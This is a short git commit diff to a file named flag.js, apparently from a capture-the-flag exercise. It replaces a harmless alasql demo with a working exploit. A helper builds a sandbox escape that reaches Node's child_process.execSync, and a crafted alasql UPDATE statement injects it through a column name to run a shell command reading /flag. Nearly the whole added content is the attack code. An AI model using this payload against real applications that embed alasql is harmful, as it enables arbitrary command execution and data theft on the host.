af794d39110ae0cf4893cce9227b98e83e6def91
vr2 <hydw9898@gmail.com>
2024-11-14 08:22:37 +0900

    Update flag.js

--- flag.js
+++ flag.js
@@ -1,20 +1,10 @@
-const alasql = require('alasql');
+const genPayload = command => `
+new Function(
+    'return this.process.mainModule.require'
+)()('child_process').execSync(${JSON.stringify(command)})
+`;
 
-// getFlag 함수 정의
-alasql.fn.getFlag = function() {
-    // CREATE TABLE 쿼리 실행
-    alasql('CREATE TABLE woo (a INT, b INT);');
 
-    // INSERT INTO 쿼리 실행
-    alasql('INSERT INTO woo VALUES (1, 2);');
-
-    // SELECT 쿼리로 결과 반환
-    const result = alasql('SELECT * FROM woo');
-    
-    // 반환할 결과
-    return `This is a flag string. Query result: ${JSON.stringify(result)}`;
-};
-
-// 예시로 함수 호출
-const flag = alasql.fn.getFlag();
-console.log(flag);  // "This is a flag string. Query result: [{a: 1, b: 2}]"
+alasql("CREATE table test");
+alasql("INSERT INTO test VALUES (1337)");
+alasql("UPDATE test SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42");
